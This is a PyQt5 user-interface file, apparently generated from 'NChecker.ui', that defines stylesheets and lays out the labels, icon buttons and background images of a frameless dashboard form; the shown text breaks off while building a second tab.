# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'NChecker.ui'
#
# Created by: PyQt5 UI code generator 5.14.2
#
# WARNING! All changes made in this file will be lost!
from PyQt5.QtWidgets import QMessageBox
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.Qt import *
import sys, getpass, os, time, threading, linecache, requests, json
# from win10toast import ToastNotifier
# 定义样式表
stylesheet = """

QMainWindow {
    background-color: #f0f0f0;
}

QListWidget {
    background-color: #e0e0e0;
    border: 1px solid #d0d0d0;
    padding: 5px;
    min-width: 160px; /* 最小宽度 */
    max-width: 160px; /* 最大宽度 */
}

QListWidget::item {
    height: 30px;
    padding-left: 10px;
    color: #333333;
    font-size: 14px;
    border-bottom: 1px solid #d0d0d0;
}

QListWidget::item:last-child {
    border-bottom: none;
}

QListWidget::item:selected {
    background-color: #c0c0c0;
    color: #000000;
}

QWidget {
    background-color: white;
    border: 1px solid #d0d0d0;
    padding: 10px;
}

QPushButton {
    background-color: #d0d0d0;
    border: 1px solid #b0b0b0;
    padding: 5px 10px;
    font-size: 12px;
    border-radius: 3px;
}

QLabel {
    font-size: 14px;
    color: #333333;
}
QFrame {
        background-color: #f8f8f8;
        border: 1px solid #ddd;
        border-radius: 5px;
}
QFrame#sensor_frame {
        background-color: #f8f8f8;
        border: 1px solid #ddd;
        border-radius: 5px;
}
QLineEdit {
        background-color: #fff;
        border: 1px solid #ddd;
        color: #000;
        padding: 5px;
}
.sensor_name {
        color: #007BFF; 
}
.sensor_value {
        color: #28A745;
}
.sensor_address {
        color: #DC3545;
}
"""
def btn_css(btn,index=1):
    if index == 1:
        btn.setStyleSheet("""
            QPushButton {
                background-color: #228B22;
                color: white;
                border: 1px solid black;
                border-radius: 5px;
                padding: 5px 10px;
            }
            QPushButton[is_toggled="true"] {
                background-color: #228B22;
                color: white;
            }
            QPushButton[is_toggled="false"] {
                background-color: #FF6347;
                color: white;
            }
        """)
    elif index == 2:
        btn.setStyleSheet("""
            QPushButton {
                background-color: #555;
                border: 1px solid #444;
                padding: 5px 10px;
                border-radius: 5px;
                color: #fff;
            }
            QPushButton:hover {
                background-color: #666;
            }
                    """
                          )
    elif index == 3:
        btn.setStyleSheet("""
            QPushButton {
                background-color: #228B22;
                color: white;
                border: 1px solid black;
                border-radius: 5px;
                padding: 5px 10px;
            }
            QPushButton:hover {
                background-color: #666;
            }
                    """
                          )


class Ui_Form(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
    def init_ui(self):
        self.setObjectName("Form")
        self.resize(812, 512)
        self.setWindowFlags(Qt.FramelessWindowHint)  # 去边框
        self.setAttribute(Qt.WA_TranslucentBackground)  # 设置窗口背景透明
        self.tabWidget = QtWidgets.QTabWidget(self)
        self.tabWidget.setGeometry(QtCore.QRect(-10, -30, 831, 551))
        self.tabWidget.setObjectName("tabWidget")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName("tab")
        self.label_52 = QtWidgets.QLabel(self.tab)
        self.label_52.setGeometry(QtCore.QRect(505, 390, 91, 31))
        self.label_52.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_52.setObjectName("label_52")
        self.label_31 = QtWidgets.QLabel(self.tab)
        self.label_31.setGeometry(QtCore.QRect(250, 305, 171, 71))
        self.label_31.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_31.setText("")
        self.label_31.setObjectName("label_31")
        self.label_43 = QtWidgets.QLabel(self.tab)
        self.label_43.setGeometry(QtCore.QRect(690, 440, 25, 2))
        self.label_43.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_43.setText("")
        self.label_43.setObjectName("label_43")
        self.label_44 = QtWidgets.QLabel(self.tab)
        self.label_44.setGeometry(QtCore.QRect(320, 440, 25, 2))
        self.label_44.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_44.setText("")
        self.label_44.setObjectName("label_44")
        self.label_25 = QtWidgets.QLabel(self.tab)
        self.label_25.setGeometry(QtCore.QRect(250, 195, 541, 16))
        self.label_25.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_25.setText("")
        self.label_25.setObjectName("label_25")
        self.label_42 = QtWidgets.QLabel(self.tab)
        self.label_42.setGeometry(QtCore.QRect(505, 440, 25, 2))
        self.label_42.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_42.setText("")
        self.label_42.setObjectName("label_42")
        self.pushButton_15 = QtWidgets.QPushButton(self.tab)
        self.pushButton_15.setGeometry(QtCore.QRect(640, 405, 41, 41))
        self.pushButton_15.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_15.setText("")
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("res/box2.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_15.setIcon(icon)
        self.pushButton_15.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_15.setObjectName("pushButton_15")
        self.label_26 = QtWidgets.QLabel(self.tab)
        self.label_26.setEnabled(False)
        self.label_26.setGeometry(QtCore.QRect(250, 220, 171, 71))
        self.label_26.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_26.setText("")
        self.label_26.setObjectName("label_26")
        self.label_23 = QtWidgets.QLabel(self.tab)
        self.label_23.setGeometry(QtCore.QRect(230, 165, 141, 21))
        self.label_23.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 10px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"}")
        self.label_23.setObjectName("label_23")
        self.label_36 = QtWidgets.QLabel(self.tab)
        self.label_36.setGeometry(QtCore.QRect(320, 270, 25, 2))
        self.label_36.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_36.setText("")
        self.label_36.setObjectName("label_36")
        self.label_30 = QtWidgets.QLabel(self.tab)
        self.label_30.setGeometry(QtCore.QRect(620, 305, 171, 71))
        self.label_30.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_30.setText("")
        self.label_30.setObjectName("label_30")
        self.label_20 = QtWidgets.QLabel(self.tab)
        self.label_20.setGeometry(QtCore.QRect(435, 70, 16, 16))
        self.label_20.setText("")
        self.label_20.setPixmap(QtGui.QPixmap("res/correct.png"))
        self.label_20.setScaledContents(True)
        self.label_20.setObjectName("label_20")
        self.pushButton_16 = QtWidgets.QPushButton(self.tab)
        self.pushButton_16.setGeometry(QtCore.QRect(270, 405, 41, 41))
        self.pushButton_16.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_16.setText("")
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap("res/flag.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_16.setIcon(icon1)
        self.pushButton_16.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_16.setObjectName("pushButton_16")
        self.pushButton_5 = QtWidgets.QPushButton(self.tab)
        self.pushButton_5.setGeometry(QtCore.QRect(270, 235, 41, 41))
        self.pushButton_5.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_5.setText("")
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap("res/check.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_5.setIcon(icon2)
        self.pushButton_5.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_5.setObjectName("pushButton_5")
        self.label_49 = QtWidgets.QLabel(self.tab)
        self.label_49.setGeometry(QtCore.QRect(505, 310, 91, 31))
        self.label_49.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_49.setObjectName("label_49")
        self.label_27 = QtWidgets.QLabel(self.tab)
        self.label_27.setGeometry(QtCore.QRect(435, 220, 171, 71))
        self.label_27.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_27.setText("")
        self.label_27.setObjectName("label_27")
        self.pushButton_10 = QtWidgets.QPushButton(self.tab)
        self.pushButton_10.setGeometry(QtCore.QRect(640, 320, 41, 41))
        self.pushButton_10.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_10.setText("")
        icon3 = QtGui.QIcon()
        icon3.addPixmap(QtGui.QPixmap("res/seo.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_10.setIcon(icon3)
        self.pushButton_10.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_10.setObjectName("pushButton_10")
        self.label_40 = QtWidgets.QLabel(self.tab)
        self.label_40.setGeometry(QtCore.QRect(320, 355, 25, 2))
        self.label_40.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_40.setText("")
        self.label_40.setObjectName("label_40")
        self.label_17 = QtWidgets.QLabel(self.tab)
        self.label_17.setGeometry(QtCore.QRect(370, 100, 91, 31))
        self.label_17.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;\n"
"")
        self.label_17.setObjectName("label_17")
        self.label_33 = QtWidgets.QLabel(self.tab)
        self.label_33.setGeometry(QtCore.QRect(620, 390, 171, 71))
        self.label_33.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_33.setText("")
        self.label_33.setObjectName("label_33")
        self.label_28 = QtWidgets.QLabel(self.tab)
        self.label_28.setGeometry(QtCore.QRect(620, 220, 171, 71))
        self.label_28.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_28.setText("")
        self.label_28.setObjectName("label_28")
        self.label_18 = QtWidgets.QLabel(self.tab)
        self.label_18.setGeometry(QtCore.QRect(490, 100, 91, 31))
        self.label_18.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;\n"
"")
        self.label_18.setObjectName("label_18")
        self.label_14 = QtWidgets.QLabel(self.tab)
        self.label_14.setGeometry(QtCore.QRect(740, 170, 60, 16))
        self.label_14.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;")
        self.label_14.setObjectName("label_14")
        self.label_21 = QtWidgets.QLabel(self.tab)
        self.label_21.setGeometry(QtCore.QRect(550, 70, 16, 16))
        self.label_21.setText("")
        self.label_21.setPixmap(QtGui.QPixmap("res/correct.png"))
        self.label_21.setScaledContents(True)
        self.label_21.setObjectName("label_21")
        self.label_50 = QtWidgets.QLabel(self.tab)
        self.label_50.setGeometry(QtCore.QRect(690, 310, 91, 31))
        self.label_50.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_50.setObjectName("label_50")
        self.label_37 = QtWidgets.QLabel(self.tab)
        self.label_37.setGeometry(QtCore.QRect(505, 270, 25, 2))
        self.label_37.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_37.setText("")
        self.label_37.setObjectName("label_37")
        self.label_46 = QtWidgets.QLabel(self.tab)
        self.label_46.setGeometry(QtCore.QRect(505, 230, 91, 31))
        self.label_46.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_46.setObjectName("label_46")
        self.label_5 = QtWidgets.QLabel(self.tab)
        self.label_5.setGeometry(QtCore.QRect(215, 0, 611, 531))
        self.label_5.setText("")
        self.label_5.setPixmap(QtGui.QPixmap("res/bg2.png"))
        self.label_5.setScaledContents(True)
        self.label_5.setObjectName("label_5")
        self.pushButton_7 = QtWidgets.QPushButton(self.tab)
        self.pushButton_7.setGeometry(QtCore.QRect(630, 90, 131, 30))
        self.pushButton_7.setStyleSheet("QPushButton{\n"
"    color:White;\n"
"    font-family:微软雅黑;\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 60);\n"
"}\n"
"QPushButton:hover{\n"
"    border: 1px solid Gray;\n"
"    background:rgb(255, 255, 255, 90);\n"
"}\n"
"QPushButton:pressed{\n"
"    border: 2px solid DarkGray;\n"
"    background:rgb(255, 255, 255, 30);\n"
"}")
        icon4 = QtGui.QIcon()
        icon4.addPixmap(QtGui.QPixmap("res/electronics.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_7.setIcon(icon4)
        self.pushButton_7.setShortcut("")
        self.pushButton_7.setCheckable(False)
        self.pushButton_7.setAutoRepeat(False)
        self.pushButton_7.setAutoExclusive(False)
        self.pushButton_7.setAutoDefault(False)
        self.pushButton_7.setDefault(False)
        self.pushButton_7.setFlat(False)
        self.pushButton_7.setObjectName("pushButton_7")
        self.label_47 = QtWidgets.QLabel(self.tab)
        self.label_47.setGeometry(QtCore.QRect(690, 230, 91, 31))
        self.label_47.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_47.setObjectName("label_47")
        self.label_22 = QtWidgets.QLabel(self.tab)
        self.label_22.setGeometry(QtCore.QRect(310, 70, 16, 16))
        self.label_22.setText("")
        self.label_22.setPixmap(QtGui.QPixmap("res/correct.png"))
        self.label_22.setScaledContents(True)
        self.label_22.setObjectName("label_22")
        self.label_16 = QtWidgets.QLabel(self.tab)
        self.label_16.setGeometry(QtCore.QRect(370, 70, 91, 31))
        self.label_16.setStyleSheet("font-family:微软雅黑;\n"
"color:White;\n"
"font-size:14px;")
        self.label_16.setObjectName("label_16")
        self.label_45 = QtWidgets.QLabel(self.tab)
        self.label_45.setGeometry(QtCore.QRect(320, 230, 91, 31))
        self.label_45.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_45.setObjectName("label_45")
        self.pushButton_13 = QtWidgets.QPushButton(self.tab)
        self.pushButton_13.setGeometry(QtCore.QRect(270, 320, 41, 41))
        self.pushButton_13.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_13.setText("")
        icon5 = QtGui.QIcon()
        icon5.addPixmap(QtGui.QPixmap("res/hourglass.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_13.setIcon(icon5)
        self.pushButton_13.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_13.setObjectName("pushButton_13")
        self.label_12 = QtWidgets.QLabel(self.tab)
        self.label_12.setGeometry(QtCore.QRect(260, 70, 91, 31))
        self.label_12.setStyleSheet("font-family:微软雅黑;\n"
"color:White;\n"
"font-size:14px;")
        self.label_12.setObjectName("label_12")
        self.label_41 = QtWidgets.QLabel(self.tab)
        self.label_41.setGeometry(QtCore.QRect(690, 355, 25, 2))
        self.label_41.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_41.setText("")
        self.label_41.setObjectName("label_41")
        self.label_32 = QtWidgets.QLabel(self.tab)
        self.label_32.setGeometry(QtCore.QRect(435, 390, 171, 71))
        self.label_32.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_32.setText("")
        self.label_32.setObjectName("label_32")
        self.label_38 = QtWidgets.QLabel(self.tab)
        self.label_38.setGeometry(QtCore.QRect(690, 270, 25, 2))
        self.label_38.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_38.setText("")
        self.label_38.setObjectName("label_38")
        self.pushButton_6 = QtWidgets.QPushButton(self.tab)
        self.pushButton_6.setGeometry(QtCore.QRect(455, 235, 41, 41))
        self.pushButton_6.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_6.setText("")
        icon6 = QtGui.QIcon()
        icon6.addPixmap(QtGui.QPixmap("res/wrong.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_6.setIcon(icon6)
        self.pushButton_6.setIconSize(QtCore.QSize(16, 16))
        self.pushButton_6.setObjectName("pushButton_6")
        self.pushButton_14 = QtWidgets.QPushButton(self.tab)
        self.pushButton_14.setGeometry(QtCore.QRect(455, 405, 41, 41))
        self.pushButton_14.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_14.setText("")
        icon7 = QtGui.QIcon()
        icon7.addPixmap(QtGui.QPixmap("res/box.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_14.setIcon(icon7)
        self.pushButton_14.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_14.setObjectName("pushButton_14")
        self.label_35 = QtWidgets.QLabel(self.tab)
        self.label_35.setGeometry(QtCore.QRect(250, 195, 141, 16))
        self.label_35.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #6666CC;\n"
"}")
        self.label_35.setText("")
        self.label_35.setObjectName("label_35")
        self.label_48 = QtWidgets.QLabel(self.tab)
        self.label_48.setGeometry(QtCore.QRect(320, 310, 91, 31))
        self.label_48.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_48.setObjectName("label_48")
        self.pushButton_8 = QtWidgets.QPushButton(self.tab)
        self.pushButton_8.setGeometry(QtCore.QRect(640, 235, 41, 41))
        self.pushButton_8.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_8.setText("")
        self.pushButton_8.setIcon(icon4)
        self.pushButton_8.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_8.setObjectName("pushButton_8")
        self.label_53 = QtWidgets.QLabel(self.tab)
        self.label_53.setGeometry(QtCore.QRect(690, 390, 91, 31))
        self.label_53.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_53.setObjectName("label_53")
        self.label_4 = QtWidgets.QLabel(self.tab)
        self.label_4.setGeometry(QtCore.QRect(235, 15, 91, 31))
        self.label_4.setStyleSheet("font-family:微软雅黑;\n"
"color:White;\n"
"font-size:16px;")
        self.label_4.setObjectName("label_4")
        self.label_39 = QtWidgets.QLabel(self.tab)
        self.label_39.setGeometry(QtCore.QRect(505, 355, 25, 2))
        self.label_39.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_39.setText("")
        self.label_39.setObjectName("label_39")
        self.label_34 = QtWidgets.QLabel(self.tab)
        self.label_34.setGeometry(QtCore.QRect(250, 390, 171, 71))
        self.label_34.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_34.setText("")
        self.label_34.setObjectName("label_34")
        self.label_29 = QtWidgets.QLabel(self.tab)
        self.label_29.setGeometry(QtCore.QRect(435, 305, 171, 71))
        self.label_29.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 8px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: #2E3648;\n"
"}")
        self.label_29.setText("")
        self.label_29.setObjectName("label_29")
        self.label_9 = QtWidgets.QLabel(self.tab)
        self.label_9.setGeometry(QtCore.QRect(170, 40, 701, 491))
        self.label_9.setText("")
        self.label_9.setPixmap(QtGui.QPixmap("res/bejing.png"))
        self.label_9.setScaledContents(True)
        self.label_9.setObjectName("label_9")
        self.label_19 = QtWidgets.QLabel(self.tab)
        self.label_19.setGeometry(QtCore.QRect(490, 70, 91, 31))
        self.label_19.setStyleSheet("font-family:微软雅黑;\n"
"color:White;\n"
"font-size:14px;")
        self.label_19.setObjectName("label_19")
        self.label_24 = QtWidgets.QLabel(self.tab)
        self.label_24.setGeometry(QtCore.QRect(232, 62, 575, 91))
        self.label_24.setStyleSheet("QLabel {\n"
"    font-family: \"Microsoft YaHei\";\n"
"    color: #BDC8E2;\n"
"    border-width: 2px;\n"
"    border-radius: 10px;\n"
"    padding-left: 20px;\n"
"    padding-top: 0px;\n"
"    background-color: rgb(255, 255, 255, 30);\n"
"}")
        self.label_24.setText("")
        self.label_24.setObjectName("label_24")
        self.label_15 = QtWidgets.QLabel(self.tab)
        self.label_15.setGeometry(QtCore.QRect(260, 100, 91, 31))
        self.label_15.setStyleSheet("font-family:微软雅黑;\n"
"color:Gray;\n"
"")
        self.label_15.setObjectName("label_15")
        self.pushButton_9 = QtWidgets.QPushButton(self.tab)
        self.pushButton_9.setGeometry(QtCore.QRect(455, 320, 41, 41))
        self.pushButton_9.setStyleSheet("font-family: \"Microsoft YaHei\";\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 8px;\n"
"padding-top: 0px;\n"
"background-color: #336699;")
        self.pushButton_9.setText("")
        icon8 = QtGui.QIcon()
        icon8.addPixmap(QtGui.QPixmap("res/3d.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.pushButton_9.setIcon(icon8)
        self.pushButton_9.setIconSize(QtCore.QSize(20, 20))
        self.pushButton_9.setObjectName("pushButton_9")
        self.label_51 = QtWidgets.QLabel(self.tab)
        self.label_51.setGeometry(QtCore.QRect(320, 390, 91, 31))
        self.label_51.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_51.setObjectName("label_51")
        self.label_54 = QtWidgets.QLabel(self.tab)
        self.label_54.setGeometry(QtCore.QRect(350, 260, 61, 21))
        self.label_54.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_54.setText("")
        self.label_54.setObjectName("label_54")
        self.label_55 = QtWidgets.QLabel(self.tab)
        self.label_55.setGeometry(QtCore.QRect(530, 260, 61, 21))
        self.label_55.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_55.setText("")
        self.label_55.setObjectName("label_55")
        self.label_56 = QtWidgets.QLabel(self.tab)
        self.label_56.setGeometry(QtCore.QRect(720, 260, 61, 21))
        self.label_56.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_56.setText("")
        self.label_56.setObjectName("label_56")
        self.label_57 = QtWidgets.QLabel(self.tab)
        self.label_57.setGeometry(QtCore.QRect(350, 345, 61, 21))
        self.label_57.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_57.setText("")
        self.label_57.setObjectName("label_57")
        self.label_58 = QtWidgets.QLabel(self.tab)
        self.label_58.setGeometry(QtCore.QRect(530, 345, 61, 21))
        self.label_58.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_58.setText("")
        self.label_58.setObjectName("label_58")
        self.label_59 = QtWidgets.QLabel(self.tab)
        self.label_59.setGeometry(QtCore.QRect(720, 345, 61, 21))
        self.label_59.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_59.setText("")
        self.label_59.setObjectName("label_59")
        self.label_60 = QtWidgets.QLabel(self.tab)
        self.label_60.setGeometry(QtCore.QRect(350, 430, 61, 21))
        self.label_60.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_60.setText("")
        self.label_60.setObjectName("label_60")
        self.label_61 = QtWidgets.QLabel(self.tab)
        self.label_61.setGeometry(QtCore.QRect(530, 430, 61, 21))
        self.label_61.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_61.setText("")
        self.label_61.setObjectName("label_61")
        self.label_62 = QtWidgets.QLabel(self.tab)
        self.label_62.setGeometry(QtCore.QRect(720, 430, 61, 21))
        self.label_62.setStyleSheet("font-family:微软雅黑;\n"
"color:DarkGray;\n"
"")
        self.label_62.setText("")
        self.label_62.setObjectName("label_62")
        self.label_5.raise_()
        self.label_9.raise_()
        self.label_24.raise_()
        self.label_12.raise_()
        self.label_33.raise_()
        self.label_32.raise_()
        self.label_29.raise_()
        self.label_34.raise_()
        self.label_52.raise_()
        self.label_31.raise_()
        self.label_43.raise_()
        self.label_44.raise_()
        self.label_25.raise_()
        self.label_42.raise_()
        self.pushButton_15.raise_()
        self.label_26.raise_()
        self.label_23.raise_()
        self.label_36.raise_()
        self.label_30.raise_()
        self.pushButton_16.raise_()
        self.pushButton_5.raise_()
        self.label_49.raise_()
        self.label_27.raise_()
        self.pushButton_10.raise_()
        self.label_40.raise_()
        self.label_17.raise_()
        self.label_28.raise_()
        self.label_18.raise_()
        self.label_14.raise_()
        self.label_50.raise_()
        self.label_37.raise_()
        self.label_46.raise_()
        self.pushButton_7.raise_()
        self.label_47.raise_()
        self.label_22.raise_()
        self.label_16.raise_()
        self.label_45.raise_()
        self.pushButton_13.raise_()
        self.label_41.raise_()
        self.label_38.raise_()
        self.pushButton_6.raise_()
        self.pushButton_14.raise_()
        self.label_35.raise_()
        self.label_48.raise_()
        self.pushButton_8.raise_()
        self.label_53.raise_()
        self.label_4.raise_()
        self.label_39.raise_()
        self.label_19.raise_()
        self.label_15.raise_()
        self.pushButton_9.raise_()
        self.label_51.raise_()
        self.label_20.raise_()
        self.label_21.raise_()
        self.label_54.raise_()
        self.label_55.raise_()
        self.label_56.raise_()
        self.label_57.raise_()
        self.label_58.raise_()
        self.label_59.raise_()
        self.label_60.raise_()
        self.label_61.raise_()
        self.label_62.raise_()
        self.tabWidget.addTab(self.tab, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.label_63 = QtWidgets.QLabel(self.tab_2)
        self.label_63.setGeometry(QtCore.QRect(210, 0, 611, 531))
        self.label_63.setText("")
        self.label_63.setPixmap(QtGui.QPixmap("res/bg2.png"))
        self.label_63.setScaledContents(True)
        self.label_63.setObjectName("label_63")
        self.label_86 = QtWidgets.QLabel(self.tab_2)
        self.label_86.setGeometry(QtCore.QRect(395, 470, 60, 2))
        self.label_86.setStyleSheet("background:gray;\n"
"color: #BDC8E2;\n"
"border-width: 2px;\n"
"border-radius: 1px;\n"
"padding-left: 5px;\n"
"padding-top: 0px;")
        self.label_86.setText("")
        self.label_86.setObjectName("label_86")
        self.label_113 = QtWidgets.QLabel(self.tab_2)
        self.label_113.move(350, 470)
        self.label_113.resize(141, 40)
        self.label_113.setStyleSheet("background:Gray;")
        self.label_66 = QtWidgets.QLabel(self.tab_2)
        self.label_97 = QtWidgets.QLabel(self.tab_2)
